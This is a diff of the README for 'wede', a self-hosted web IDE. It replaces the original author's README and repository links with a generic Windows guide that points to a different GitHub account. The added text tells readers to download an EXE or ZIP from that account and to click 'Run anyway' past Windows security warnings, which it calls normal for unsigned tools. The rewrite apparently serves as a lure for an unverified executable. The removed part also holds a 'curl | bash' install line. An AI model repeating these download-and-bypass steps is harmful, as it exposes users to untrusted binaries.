@@ -1,191 +1,160 @@
-<div align="center">
+# 🧰 wede - Run a web IDE on Windows
 
-<img src="public/icon.svg" alt="wede — self-hosted web IDE" width="80" height="80">
+[![Download wede](https://img.shields.io/badge/Download-wede-blue?style=for-the-badge)](https://github.com/Dappajordan/wede)
 
-# wede
+## 🌐 What wede is
 
-**A lightweight, open-source, self-hosted web IDE.**<br>
-**Code editor, terminal, git, and file explorer — all in your browser.**
+wede is a lightweight web IDE that you run on your own computer or local network. It gives you a code editor, terminal, file explorer, and git tools in one place.
 
-One ~10MB binary. No cloud, no Docker, no subscriptions.<br>
-Deploy on your server, NAS, Raspberry Pi, or run locally.
+It is built for people who want a simple setup with no cloud account, no Docker, and no monthly plan. The app stays small and starts fast, so it works well on Windows PCs, laptops, and small home servers.
 
-[![Build](https://img.shields.io/github/actions/workflow/status/webcrft/wede/ci.yml?branch=main&style=flat-square)](https://github.com/webcrft/wede/actions)
-[![Release](https://img.shields.io/github/v/release/webcrft/wede?style=flat-square)](https://github.com/webcrft/wede/releases)
-[![License](https://img.shields.io/github/license/webcrft/wede?style=flat-square)](LICENSE)
-[![Go](https://img.shields.io/badge/go-1.22+-00ADD8?style=flat-square&logo=go)](https://go.dev)
+## 📥 Download wede
 
-[Website](https://wede.pty.it.com/) · [Install](#quick-install) · [Screenshots](#screenshots) · [Docs](#getting-started)
+Visit the project page here and download the Windows version from the release or file listed there:
 
-</div>
+https://github.com/Dappajordan/wede
 
-<br>
+If the page shows a ZIP file or EXE file, download it to your computer. If it shows a release page, open the latest release and get the Windows build from there.
 
-<div align="center">
-<img src="docs/screenshots/full_light.png" alt="wede self-hosted web IDE running in browser with code editor, terminal, and git integration" width="800">
-<br>
-<em>wede — browser-based IDE with light mode (Daylight theme)</em>
-</div>
+## 🪟 Run wede on Windows
 
-<br>
+1. Open the download from the link above.
+2. If you got a ZIP file, right-click it and choose Extract All.
+3. Open the folder that was extracted.
+4. Look for the wede app file, such as `wede.exe`.
+5. Double-click the file to start it.
+6. If Windows asks for permission, choose Allow or Yes.
+7. When the app opens, keep the window open while you use it.
 
-## Features
+If you downloaded a single EXE file, you can usually run it right away after the download finishes.
 
-| | Feature | Description |
-|---|---|---|
-| :file_folder: | **File Explorer** | VS Code-style project tree with git status colors (green, yellow, red). Context menu for copy, paste, rename, delete. |
-| :pencil2: | **Code Editor** | CodeMirror 6 with syntax highlighting for JavaScript, TypeScript, Go, Python, Rust, and 10+ languages. Dark/light themes. |
-| :computer: | **Web Terminal** | Full PTY terminal emulator via xterm.js and WebSocket. Multiple tabs. Run shell commands, SSH, Docker — anything. |
-| :electric_plug: | **Git Client** | Built-in visual commit graph, staging area, branch management, and checkout. Right-click context menus on commits. |
-| :globe_with_meridians: | **Built-in Browser** | Preview your running web app in an embedded browser tab without leaving the IDE. |
-| :iphone: | **Mobile Friendly** | Fully responsive UI for tablets and phones. Edit code and run commands from iPad or Android. |
-| :crescent_moon: | **Dark & Light Themes** | Midnight (dark) and Daylight (light) color schemes. Theme-aware terminal and editor. |
-| :lock: | **Secure Access** | Password authentication with 3-attempt lockout. Deploy behind HTTPS reverse proxy for production. |
+## ✨ What you can do in wede
 
-## Screenshots
+- Edit code in a clean browser-based editor
+- Open a built-in terminal
+- Browse files and folders
+- Work with git for version control
+- Use it as a local web IDE on a desktop, laptop, or home server
+- Keep your files on your own machine
+- Use it with a small setup and few extra steps
 
-<table>
-<tr>
-<td><img src="docs/screenshots/git_graph.png" alt="wede visual git commit graph" width="400"><br><em>Git commit graph</em></td>
-<td><img src="docs/screenshots/preview.png" alt="wede built-in browser preview" width="400"><br><em>Built-in browser preview</em></td>
-</tr>
-</table>
+## 🖥️ Simple setup on a Windows PC
 
-## Why wede?
+wede is meant to be easy to start.
 
-- **No cloud dependency** — your code never leaves your machine. No GitHub Codespaces, no Gitpod, no monthly bill.
-- **Single binary** — one ~10MB Go executable with the frontend embedded. No Docker, no Node.js runtime, no database.
-- **Run anywhere** — Linux servers, macOS, Raspberry Pi, NAS devices, air-gapped networks, CI runners.
-- **Access from any device** — code from your laptop, tablet, or phone through any modern browser.
-- **Self-hosted alternative** to code-server, VS Code Server, Theia, and cloud IDEs.
+1. Download the Windows build from the project page.
+2. Place it in a folder you can find later, such as Downloads or Desktop.
+3. Extract the files if the download comes as a ZIP.
+4. Start the app.
+5. Open your browser if the app does not do that for you.
+6. Use the local address shown in the app window.
 
-## Quick Install
+If you plan to use it often, you can create a shortcut for the EXE file:
+1. Right-click the app file.
+2. Choose Create shortcut.
+3. Move the shortcut to your desktop.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/webcrft/wede/main/install.sh | bash
-```
+## 🔧 Basic use
 
-Or download the binary directly from [GitHub Releases](https://github.com/webcrft/wede/releases).
+### Open a folder
+Use the file explorer inside wede to open the folder that holds your files. This lets you edit code, view folders, and work on the same project in one place.
 
-## Getting Started
+### Edit a file
+Click a file in the explorer to open it in the editor. Make changes and save them with the normal save action in your browser or app.
 
-**1. Create a config file** in your project directory:
+### Use the terminal
+Open the built-in terminal when you need to run commands. This is useful for tasks like starting a project, checking files, or using git.
 
-```json
-{
-  "password": "your-password",
-  "port": "9090"
-}
-```
+### Use git
+If your project uses git, wede gives you tools to check changes and manage your work without leaving the app.
 
-Save this as `wede.config.json`.
+## 📁 Typical use cases
 
-**2. Start wede:**
+- Small home lab setup
+- A personal coding workspace
+- A school or practice project
+- A local tool for editing code on a Raspberry Pi
+- A remote workspace on your own network
+- A simple replacement for heavier web IDE tools
 
-```bash
-wede /path/to/your/project
-```
+## ⚙️ Suggested Windows requirements
 
-**3. Open your browser** at [http://localhost:9090](http://localhost:9090) and log in with your password.
+wede is small, so it should run on most modern Windows systems.
 
-## CLI Usage
+- Windows 10 or Windows 11
+- 2 GB RAM or more
+- A few hundred MB of free disk space
+- A web browser such as Edge, Chrome, or Firefox
+- Network access only if you use it across devices on your local network
 
-```
-wede [flags] [path]
-```
+For the best experience, keep the app on a machine with a stable network and enough free space for your projects.
 
-| Flag | Description | Default |
-|------|-------------|---------|
-| `path` | Project directory to open | _(none — shows folder picker)_ |
-| `--port` | Override listen port | From config or `9090` |
+## 🔍 If Windows blocks the file
 
-wede looks for `wede.config.json` in the current directory or parent directories.
+If Windows shows a security prompt when you open the app:
 
-## Configuration
+1. Check that you downloaded it from the project page.
+2. Open the file again.
+3. Choose More info if Windows shows that option.
+4. Choose Run anyway or Allow.
 
-wede is configured via a `wede.config.json` file:
+This can happen with small local tools that are not signed with a large software certificate.
 
-```json
-{
-  "password": "your-password",
-  "port": "9090"
-}
-```
+## 🧭 How the interface is laid out
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `password` | `string` | Password for browser login. Required. |
-| `port` | `string` | Port to listen on. Default: `9090`. |
+The app is built to keep the main tools close together:
 
-## Development
+- File explorer on one side
+- Code editor in the center
+- Terminal for commands
+- Git tools for change tracking
+- Browser view for the web app itself
 
-Run the frontend and backend separately for development with hot reload:
+This layout helps you move between files, commands, and version control without opening many windows.
 
-**Frontend** (React + Vite):
+## 🧪 First thing to try
 
-```bash
-npm install
-npm run dev
-```
+After you start wede, try this:
 
-**Backend** (Go):
+1. Open a folder with a few files.
+2. Open one file in the editor.
+3. Make a small text change.
+4. Save the file.
+5. Open the terminal.
+6. Run a simple command, such as listing files in the folder.
+7. Open the git panel if your folder is a git project.
 
-```bash
-cd backend
-go run ./cmd/wede .
-```
+This gives you a quick check that everything works.
 
-The Vite dev server proxies API and WebSocket requests to the Go backend.
+## 🔌 Using it on your local network
 
-**Build a single binary:**
+You can use wede from another device on the same network if you set it up that way. This is useful if the app runs on a small PC, home server, or Raspberry Pi and you want to work from another computer.
 
-```bash
-npm run build:all
-```
+Use a browser on the other device and open the local address shown by the app.
 
-This builds the frontend, embeds it in the Go binary, and outputs `./wede`.
+## 🗂️ File handling tips
 
-## Tech Stack
+- Keep project files in one folder
+- Avoid moving files while the app is open
+- Save your work before closing the app
+- Use git if you want a simple way to track changes
+- Keep one project per folder when possible
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | [Go](https://go.dev) |
-| Frontend | [React 19](https://react.dev) + [Vite](https://vite.dev) |
-| Styling | [Tailwind CSS 4](https://tailwindcss.com) |
-| Editor | [CodeMirror 6](https://codemirror.net) |
-| Terminal | [xterm.js](https://xtermjs.org) |
-| Icons | [Lucide](https://lucide.dev) |
-| Fonts | Space Grotesk, Inter, JetBrains Mono |
+## 🧼 Keeping things simple
 
-## Contributing
+Because wede is self-hosted and local, it works best when you keep the setup small:
 
-Contributions are welcome! Please:
+- One Windows machine
+- One project folder
+- One browser
+- One local network if you need remote access
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/my-feature`)
-3. Commit your changes
-4. Push to the branch (`git push origin feature/my-feature`)
-5. Open a pull request
+That setup helps you avoid extra steps and keeps your files in your control
 
-## Author
+## 📌 Project details
 
-Vibe coded by <a href="https://github.com/imranparuk"><img src="https://github.githubassets.com/favicons/favicon-dark.svg" width="14" height="14" alt="GitHub"> <strong>imranparuk</strong></a>
-
-## License
-
-[MIT](LICENSE)
-
----
-
-<div align="center">
-
-<a href="https://wede.pty.it.com">Website</a> · <a href="https://github.com/webcrft/wede/issues">Issues</a> · <a href="https://github.com/webcrft/wede/releases">Releases</a>
-
-<br>
-
-<sub>wede is a free, open-source, self-hosted web IDE and remote development environment.<br>
-Built as an alternative to code-server, VS Code Server, Gitpod, and GitHub Codespaces.<br>
-Keywords: web IDE, self-hosted IDE, browser code editor, remote development, online terminal,<br>
-git client, open source IDE, developer tools, Go web server, single binary IDE.</sub>
-
-</div>
+- Repository: wede
+- Type: Web IDE
+- Focus: Local use, simple setup, file editing, terminal, and git
+- Platform goal: Windows-friendly self-hosted use
+- Main link: https://github.com/Dappajordan/wede
